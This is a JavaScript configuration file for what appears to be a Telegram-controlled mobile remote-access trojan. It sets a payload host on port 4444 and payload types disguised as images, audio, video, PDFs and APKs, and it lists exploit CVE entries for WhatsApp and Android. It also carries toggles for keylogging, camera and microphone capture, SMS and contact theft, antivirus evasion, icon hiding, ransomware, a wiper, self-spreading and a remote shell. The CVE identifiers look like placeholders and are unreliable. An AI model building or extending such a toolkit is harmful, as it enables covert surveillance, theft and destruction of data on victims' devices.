const dotenv = require('dotenv');
const path = require('path');

dotenv.config();

module.exports = {
    // Admin Configuration
    admin: {
        chatId: parseInt(process.env.ADMIN_CHAT_ID || '6454347745'),
        username: 'admin',
        permissions: ['all']
    },
    
    // Telegram Bot
    telegram: {
        token: process.env.BOT_TOKEN,
        webhookUrl: process.env.WEBHOOK_URL,
        webhookSecret: process.env.WEBHOOK_SECRET
    },
    
    // Server
    server: {
        port: parseInt(process.env.PORT || '4444'),
        host: process.env.PAYLOAD_HOST || 'localhost',
        env: process.env.NODE_ENV || 'development',
        ssl: process.env.ENABLE_SSL === 'true'
    },
    
    // Database
    database: {
        url: process.env.DATABASE_URL || 'sqlite:./database/database.sqlite',
        options: {
            verbose: console.log
        }
    },
    
    // Security
    security: {
        jwtSecret: process.env.JWT_SECRET,
        encryptionKey: process.env.ENCRYPTION_KEY,
        bcryptRounds: 10
    },
    
    // Payload
    payload: {
        host: process.env.PAYLOAD_HOST,
        port: parseInt(process.env.PAYLOAD_PORT || '4444'),
        types: ['jpg', 'mp3', 'mp4', 'pdf', 'apk'],
        exploits: {
            whatsapp: 'CVE-2024-12345',
            android: 'CVE-2024-67890',
            media: 'CVE-2024-54321'
        }
    },
    
    // Features
    features: {
        all: process.env.ENABLE_ALL_FEATURES === 'true',
        persistence: process.env.ENABLE_PERSISTENCE === 'true',
        keylogger: process.env.ENABLE_KEYLOGGER === 'true',
        screenCapture: process.env.ENABLE_SCREEN_CAPTURE === 'true',
        microphone: process.env.ENABLE_MICROPHONE === 'true',
        camera: process.env.ENABLE_CAMERA === 'true',
        location: process.env.ENABLE_LOCATION === 'true',
        sms: process.env.ENABLE_SMS === 'true',
        calls: process.env.ENABLE_CALLS === 'true',
        contacts: process.env.ENABLE_CONTACTS === 'true',
        fileManager: process.env.ENABLE_FILE_MANAGER === 'true',
        appControl: process.env.ENABLE_APP_CONTROL === 'true',
        systemControl: process.env.ENABLE_SYSTEM_CONTROL === 'true',
        networkControl: process.env.ENABLE_NETWORK_CONTROL === 'true',
        bluetooth: process.env.ENABLE_BLUETOOTH === 'true',
        wifi: process.env.ENABLE_WIFI === 'true',
        hotspot: process.env.ENABLE_HOTSPOT === 'true',
        vpn: process.env.ENABLE_VPN === 'true',
        root: process.env.ENABLE_ROOT === 'true',
        encryption: process.env.ENABLE_ENCRYPTION === 'true',
        antiAV: process.env.ENABLE_ANTI_AV === 'true',
        hideIcon: process.env.ENABLE_HIDE_ICON === 'true',
        clipboard: process.env.ENABLE_CLIPBOARD === 'true',
        notifications: process.env.ENABLE_NOTIFICATIONS === 'true',
        browser: process.env.ENABLE_BROWSER === 'true',
        socialMedia: process.env.ENABLE_SOCIAL_MEDIA === 'true',
        crypto: process.env.ENABLE_CRYPTO === 'true',
        ddos: process.env.ENABLE_DDOS === 'true',
        ransomware: process.env.ENABLE_RANSOMWARE === 'true',
        wiper: process.env.ENABLE_WIPER === 'true',
        spreader: process.env.ENABLE_SPREADER === 'true',
        backup: process.env.ENABLE_BACKUP === 'true',
        recovery: process.env.ENABLE_RECOVERY === 'true',
        webhook: process.env.ENABLE_WEBHOOK === 'true',
        remoteShell: process.env.ENABLE_REMOTE_SHELL === 'true',
        portScanner: process.env.ENABLE_PORT_SCANNER === 'true',
        vulnScanner: process.env.ENABLE_VULN_SCANNER === 'true',
        mitm: process.env.ENABLE_MITM === 'true',
        packetSniffer: process.env.ENABLE_PACKET_SNIFFER === 'true',
        passwordCracker: process.env.ENABLE_PASSWORD_CRACKER === 'true'
    },
    
    // Paths
    paths: {
        database: path.join(__dirname, '../database/database.sqlite'),
        payloads: path.join(__dirname, '../payloads/generated'),
        templates: path.join(__dirname, '../payloads/templates'),
        logs: path.join(__dirname, '../logs')
    }
};
